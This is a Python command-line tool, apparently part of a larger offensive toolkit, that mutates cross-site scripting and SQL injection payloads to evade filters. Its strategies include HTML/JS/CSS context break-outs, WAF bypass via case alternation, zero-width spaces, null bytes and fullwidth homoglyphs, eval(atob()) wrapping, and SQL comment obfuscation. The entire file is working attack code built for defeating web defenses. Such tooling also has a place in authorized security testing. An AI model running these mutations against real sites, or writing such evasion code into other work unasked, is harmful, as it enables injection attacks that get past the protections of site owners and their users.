#!/usr/bin/env python3
"""
oc v3.3 — Seed-Mutation Engine for Exploit Evolution
======================================================
Transforms base seed payloads via deterministic mutation strategies so that
the HUNT phase can iterate systematically rather than guessing. Each strategy
is a pure function: given the same seed + strategy, the output is always the
same (no randomness — reproducibility matters for PoC reliability).

Strategies:
  url_encode_all   — Full percent-hex encoding of every byte.
  url_encode_all_double — Double URL encoding (nested percent).
  tag_break        — Prepend context-escape sequences to break out of
                     HTML/JS/CSS/attribute contexts.
  bypass_waf       — Case alternation + inline obfuscation characters
                     (zero-width spaces, comments, null bytes).
  base64_wrap      — Base64-encode the payload and wrap in eval/atob.
  unicode_escape   — Convert to \\uXXXX JavaScript unicode escapes.
  html_entity      — Encode as HTML entities (named + numeric).
  json_escape      — Escape for JSON string context (backslash-escape
                     quotes, backslashes, control chars).
  sql_comment_wrap — Wrap SQLi payloads in inline comment obfuscation
                     (/**/, #, --).
  case_variation   — Toggle case of alphabetic characters only.

Usage:
  python3 mcp/payload_mutator.py --seed "<script>alert(1)</script>" --strategy url_encode_all
  python3 mcp/payload_mutator.py --seed-file payload.txt --strategy bypass_waf
  python3 mcp/payload_mutator.py --seed "<script>alert(1)</script>" --all > mutations.json
"""

import sys
import json
import os
import re
import argparse
import base64
import html
from typing import Callable
from urllib.parse import quote, quote_plus


# ---------------------------------------------------------------------------
# Mutation strategy implementations
# ---------------------------------------------------------------------------

def _url_encode_all(seed: str) -> str:
    """Percent-encode every byte of the seed."""
    return "".join(f"%{ord(c):02X}" for c in seed)


def _url_encode_all_double(seed: str) -> str:
    """Double percent-encode: encode once, then encode the '%' signs again."""
    once = "".join(f"%{ord(c):02X}" for c in seed)
    return "".join(f"%{ord(c):02X}" for c in once)


def _tag_break(seed: str) -> str:
    """
    Prepend context-escape sequences that attempt to break out of common
    injection contexts: HTML comment, script block, attribute value,
    and CSS context. Also produces single-context variants.
    """
    escapes = [
        # HTML comment break
        ("html_comment", f"--><script>{seed}</script><!--"),
        # Script block break
        ("script_break", f"</script><script>{seed}</script><script>"),
        # Double-quoted attribute break
        ("attr_double", f"\"><script>{seed}</script>\""),
        # Single-quoted attribute break
        ("attr_single", f"'><script>{seed}</script>'"),
        # CSS break (inside style tag/attribute)
        ("css_break", f"</style><script>{seed}</script><style>"),
        # SVG/XML CDATA break
        ("xml_cdata", f"]]><script>{seed}</script><![CDATA["),
        # Backtick template literal (JS)
        ("template_literal", f"${{({seed})}}"),
        # Multi-line comment break
        ("multiline_comment", f"*/{seed}/*"),
    ]

    # Return as JSON array of variants for structured consumption
    variants = [{"context": ctx, "payload": p} for ctx, p in escapes]
    # Also include the raw seed with just a minimal break prefix
    variants.append({"context": "bare", "payload": seed})
    return json.dumps(variants)


def _bypass_waf(seed: str) -> str:
    """
    WAF bypass mutation: alternate character case and insert non-functional
    obfuscation markers (zero-width spaces, HTML comments, null bytes) at
    positions that WAF regex engines often fail to handle correctly.

    Returns a JSON array of variant payloads.
    """
    variants = []

    # 1. Case alternation: aLtErNaTiNg CaSe
    alt_case = "".join(
        c.upper() if i % 2 else c.lower()
        for i, c in enumerate(seed)
    )
    variants.append({"technique": "case_alternation", "payload": alt_case})

    # 2. Zero-width space insertion between every character
    zwsp_variant = "​".join(seed)
    variants.append({"technique": "zero_width_spaces", "payload": zwsp_variant})

    # 3. HTML comment injection within the payload body
    #    e.g., <scr<!-- -->ipt>alert(1)</sc<!-- -->ript>
    commented = re.sub(r"(.)", r"\1<!-- -->", seed)
    variants.append({"technique": "html_comments", "payload": commented})

    # 4. Null byte injection (for backends that truncate at \0)
    nulled = "\x00".join(seed)
    variants.append({"technique": "null_bytes", "payload": nulled})

    # 5. Tab/newline insertion (for HTTP header folding / multi-line bypass)
    crlf_variant = seed.replace(" ", "\t\n ")
    variants.append({"technique": "whitespace_folding", "payload": crlf_variant})

    # 6. Mixed: case alternation + zero-width chars
    mixed_alt = "".join(
        (c.upper() if i % 2 else c.lower()) + "​"
        for i, c in enumerate(seed)
    )
    variants.append({"technique": "case_alt_plus_zwsp", "payload": mixed_alt})

    # 7. URL-encoded key characters only
    key_chars_url = re.sub(
        r"([<>\"'();:,\[\]{}/?&=#%+])",
        lambda m: f"%{ord(m.group(1)):02X}",
        seed,
    )
    variants.append({"technique": "key_chars_url_encoded", "payload": key_chars_url})

    # 8. Unicode homoglyph substitution (confusable chars)
    homoglyphs = str.maketrans({
        "<": "＜",  # Fullwidth less-than
        ">": "＞",  # Fullwidth greater-than
        "'": "＇",  # Fullwidth apostrophe
        '"': "＂",  # Fullwidth quotation mark
        "/": "／",  # Fullwidth solidus
        ";": "；",  # Fullwidth semicolon
        "=": "＝",  # Fullwidth equals sign
        "(": "（",  # Fullwidth left parenthesis
        ")": "）",  # Fullwidth right parenthesis
    })
    homoglyph_variant = seed.translate(homoglyphs)
    variants.append({"technique": "unicode_homoglyphs", "payload": homoglyph_variant})

    return json.dumps(variants)


def _base64_wrap(seed: str) -> str:
    """Base64-encode and wrap in JavaScript eval(atob(...))."""
    b64 = base64.b64encode(seed.encode("utf-8")).decode("ascii")
    return f"eval(atob('{b64}'))"


def _unicode_escape(seed: str) -> str:
    """Convert every character to \\uXXXX JavaScript unicode escape."""
    return "".join(f"\\u{ord(c):04X}" for c in seed)


def _html_entity(seed: str) -> str:
    """Encode as HTML entities (named where possible, numeric otherwise)."""
    return html.escape(seed)


def _html_entity_full(seed: str) -> str:
    """Encode EVERY character as &#xNN; numeric entities."""
    return "".join(f"&#x{ord(c):X};" for c in seed)


def _json_escape(seed: str) -> str:
    """Escape for JSON string context."""
    return json.dumps(seed)[1:-1]  # strip outer quotes


def _sql_comment_wrap(seed: str) -> str:
    """
    Wrap SQL injection payloads in inline comment obfuscation.
    Produces MySQL, MSSQL, and Oracle variants.
    """
    variants = [
        {"technique": "mysql_inline_comment", "payload": seed.replace(" ", "/**/")},
        {"technique": "mysql_hex_comment", "payload": f"/*!{seed}*/"},
        {"technique": "mssql_line_comment", "payload": f"{seed}\n--"},
        {"technique": "oracle_double_dash", "payload": f"{seed}--"},
        {"technique": "nullbyte_truncation", "payload": f"{seed}\x00"},
        {"technique": "nested_comments", "payload": f"/*/*/{seed}/*/*/"},
    ]
    return json.dumps(variants)


def _case_variation(seed: str) -> str:
    """Toggle case of alphabetic characters."""
    return seed.swapcase()


# ---------------------------------------------------------------------------
# Strategy registry
# ---------------------------------------------------------------------------

STRATEGIES: dict[str, Callable[[str], str]] = {
    "url_encode_all": _url_encode_all,
    "url_encode_all_double": _url_encode_all_double,
    "tag_break": _tag_break,
    "bypass_waf": _bypass_waf,
    "base64_wrap": _base64_wrap,
    "unicode_escape": _unicode_escape,
    "html_entity": _html_entity,
    "html_entity_full": _html_entity_full,
    "json_escape": _json_escape,
    "sql_comment_wrap": _sql_comment_wrap,
    "case_variation": _case_variation,
}


# ---------------------------------------------------------------------------
# CLI interface
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="oc v3.3 Payload Mutation Engine — deterministic exploit evolution"
    )
    parser.add_argument(
        "--seed",
        help="Base payload string to mutate"
    )
    parser.add_argument(
        "--seed-file",
        help="Read seed payload from a file"
    )
    parser.add_argument(
        "--strategy", "-s",
        choices=list(STRATEGIES.keys()) + ["all"],
        help="Mutation strategy to apply. Use 'all' to run every strategy."
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Run all mutation strategies on the seed"
    )
    parser.add_argument(
        "--output", "-o",
        choices=["json", "text"],
        default="json",
        help="Output format (default: json)"
    )
    parser.add_argument(
        "--list-strategies",
        action="store_true",
        help="List all available mutation strategies and exit"
    )

    args = parser.parse_args()

    if args.list_strategies:
        print(json.dumps({
            "strategies": sorted(STRATEGIES.keys()),
            "count": len(STRATEGIES),
        }, indent=2))
        return

    # Resolve seed
    if args.seed_file:
        with open(args.seed_file, "r", encoding="utf-8") as f:
            seed = f.read().strip()
    elif args.seed:
        seed = args.seed
    else:
        # Try reading from stdin
        if not sys.stdin.isatty():
            seed = sys.stdin.read().strip()
        else:
            print(json.dumps({"error": "No seed provided. Use --seed, --seed-file, or pipe via stdin."}))
            sys.exit(1)

    if not seed:
        print(json.dumps({"error": "Seed payload is empty."}))
        sys.exit(1)

    # Resolve strategy selection
    if args.all or args.strategy == "all":
        strategies_to_run = list(STRATEGIES.keys())
    elif args.strategy:
        strategies_to_run = [args.strategy]
    else:
        print(json.dumps({"error": "No strategy selected. Use --strategy <name> or --all."}))
        sys.exit(1)

    # Run mutations
    results = {
        "seed": seed,
        "seed_length": len(seed),
        "mutations": {},
    }

    for strategy_name in strategies_to_run:
        try:
            output = STRATEGIES[strategy_name](seed)
            results["mutations"][strategy_name] = {
                "payload": output,
                "length": len(output),
            }
        except Exception as exc:
            results["mutations"][strategy_name] = {
                "error": str(exc),
            }

    if args.output == "text":
        for strat_name, data in results["mutations"].items():
            payload = data.get("payload", data.get("error", ""))
            print(f"=== {strat_name} ===")
            print(payload)
            print()
    else:
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
